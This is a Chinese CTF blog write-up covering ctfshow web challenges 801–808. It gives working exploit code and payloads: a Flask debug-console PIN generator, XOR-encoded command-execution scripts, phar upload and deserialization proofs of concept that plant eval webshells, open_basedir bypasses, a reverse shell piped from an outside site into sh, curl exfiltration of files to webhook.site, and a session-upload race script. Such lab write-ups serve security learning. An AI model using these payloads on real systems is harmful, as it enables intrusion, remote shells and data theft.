---
title: ctfshow-常用姿势
date: 2024-12-01 19:48:14
tags: ctfshow
categories: 学习笔记
---

## **flask算PIN**

### web801

先获取mac地址

```
/file?filename=/sys/class/net/eth0/address
```

![image-20241201200156755](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012001827.png)

先把冒号去了，然后十六进制再转十进制

得到

```
2485377605532
```

我们找个flask算pin的脚本

```py
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username='root'
app = Flask(__name__)
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)
mod=sys.modules.get(modname)
mod = getattr(mod, "__file__", None)

probably_public_bits = [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
   mac,#mac地址十进制
 "机器码"
     ]
print(private_bits)
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

```

这里我们需要机器码，我们先访问**/proc/self/cgroup**

得到

```
d1b9d0725f0d084e96c039bb557a13646b2c418388ed006646ab107f3c435778
```

然后再访问**/etc/machine-id或者/proc/sys/kernel/random/boot_id**

```
225374fa-04bc-4346-9f39-48fa82829ca9
```

拼接一下得到机器码

```
225374fa-04bc-4346-9f39-48fa82829ca9d1b9d0725f0d084e96c039bb557a13646b2c418388ed006646ab107f3c435778
```

我们到脚里修改机器码，运行得到pin值

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012007621.png)

我们访问console，将密码填进去

![image-20241201200825063](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012008128.png)

得到flag

```
import os
os.popen('cat /f*').read();
```

![image-20241201201555230](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012015293.png)

## **无字母数字命令执行**

### web802

https://blog.csdn.net/miuzzx/article/details/109143413

用这套无字母数字rce脚本

```php
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256 ; $j++) {

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z]|[0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }

        else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)^urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\n";
            }
        }

    }
}
fwrite($myfile,$contents);
fclose($myfile);


```

得到xor_rce文件后，运行配套python脚本

```py
# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)

```

![image-20241201202702195](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012027248.png)

输入方法和命令，我们进行传参，成功执行命令

![image-20241201202722292](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412012027341.png)

```
system(tac flag.php)

("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%08%01%03%00%06%0c%01%07%00%0b%08%0b"^"%7c%60%60%20%60%60%60%60%2e%7b%60%7b");
```

传入得到flag



##  **phar文件包含**

### web803

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

我们看到题目web目录下没有写权限，需要写到其他地方比如/tmp下

首先生成phar文件

```php
<?php 
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>


```

接着上传文件

```python
import requests  
url="http://d4d6bb42-e30d-4ed7-b823-baa8ec7e8cc8.challenge.ctf.show/index.php"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)

```

得到flag

## **phar反序列化**

### web804

https://z3r4y.blog.csdn.net/article/details/134479335

[【Web】Phar反序列化相关例题wp_newstarctf pharone-CSDN博客](https://blog.csdn.net/uuzeray/article/details/134362720)

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);

class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

我们发现代码里有个unlink函数，那这题大概率是phar反序列化

我们构造poc链

```php
<?php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}
$a=new hacker();
$a->code="system('cat f*');";
 
 
$phar = new Phar("test.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
 
?>
```

接着上传文件

```php
import requests
url="http://5d5c1d43-55e2-45d0-877a-ef8da113932e.challenge.ctf.show/"
 
file={'file':'/tmp/a.phar','content':open('test.phar','rb').read()}
data={'file':'phar:///tmp/a.phar','content':'suibian'}
requests.post(url,data=file)
r=requests.post(url,data=data)
print(r.text)
```

得到flag

## **open_basedir绕过**

### web805

[从0学习bypass open_basedir姿势 - 先知社区](https://xz.aliyun.com/t/10070?time__1311=mq%2BxBD9QDQe4RDBkPoGkFoD%3Dq0QY%2BUx%3Dx&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-12)

我们看一下phpinfo();

![image-20241202193843967](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412021938090.png)

可以看到命令执行函数都被ban了，那我们读文件可以用readfile或include

查看目录

```bash
1=mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
```

得到flag

```bash
1=mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/ctfshowflag');
```

## **php无参RCE**

### web806

https://xz.aliyun.com/t/9360

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

highlight_file(__FILE__);

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
?>
```

**`[^\W]+`**：

- `[^\W]` 是一个字符类，`^\W` 意味着“匹配不是非单词字符（`\W`）的字符”，因此它等同于 `[a-zA-Z0-9_]`，也就是字母、数字或下划线。
- `+` 表示“匹配一个或多个”这样的字符。

所以 `/[^\W]+/` 匹配一个或多个字母、数字或下划线，表示一个词或标识符。

**`\(` 和 `\)`**：

- 这两个是转义字符，用来匹配字面上的圆括号 `(` 和 `)`。`(` 和 `)` 在正则表达式中有特殊意义（分别表示捕获组和分组），所以在这里需要用 `\` 进行转义，表示它们是字面意义上的括号。

**`(?R)?`**：

- `(?R)` 是一个递归调用，在正则表达式中，`(?R)` 表示递归地匹配整个正则表达式（即自调用）。这意味着在括号内可以再次匹配相同的模式。
- `?` 表示这个递归是可选的，也就是说括号内的内容不一定要再次进行递归匹配。

payload

```
?code=eval(end(current(get_defined_vars())));&Z3r4y=system('cat /ctfshowflag');
```



## shell反弹

### web807

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

$schema = substr($url,0,8);

if($schema==="https://"){
    shell_exec("curl $url");
}
```

**法1：反弹shell**

推荐一个网站：https://your-shell.com/

payload

```
?url=https://your-shell.com/ip:1337 | sh
```

ip为自己服务器ip

先在服务器上监听1337端口

然后找flag

![image-20241202201756820](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412022017917.png)

**法2：vps外带**

我们利用https://webhook.site/进行flag外带

```
?url=https://webhook.site/25364e81-eb5f-4bed-bdd8-ef0954269270?flag=`cat /*`
```

![image-20241202202319556](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412022023601.png)



## 卡临时文件包含

### web808

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-20 11:01:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-20 22:18:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
$file = $_GET['file'];


if(isset($file) && !preg_match("/input|data|phar|log/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    print_r(scandir("/tmp"));
}

Array ( [0] => . [1] => .. )
```

临时文件的复现难度很大，建议直接session文件包含

用下面脚本打

```python
import requests
import threading
 
session = requests.session()
 
sess = "ctfshow"
 
file_name = "/var/www/html/1.php"
file_content = '<?php eval($_POST[1]);?>'
 
url = "http://3fd00eb3-48d8-4a13-99e6-4dcced70454f.challenge.ctf.show/"
 
data = {
    "PHP_SESSION_UPLOAD_PROGRESS": f"<?php echo 'success!'; file_put_contents('{file_name}','{file_content}');?>"
}
 
file = {
    'file': 'ctfshow'
}
 
cookies = {
    'PHPSESSID': sess
}
 
 
def write():
    while True:
        r = session.post(url=url, data=data, files=file, cookies=cookies)
 
 
def read():
    while True:
        r = session.post(url=url + "?file=/tmp/sess_ctfshow")
        if "success" in r.text:
            print("shell 地址为：" + url + "1.php")
            exit()
 
 
if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write).start()
        for i in range(1, 30):
            threading.Thread(target=read).start()
    event.set()
```

能不能出看运气，超级讨厌这种题

## **pear文件包含/RCE**

### web809
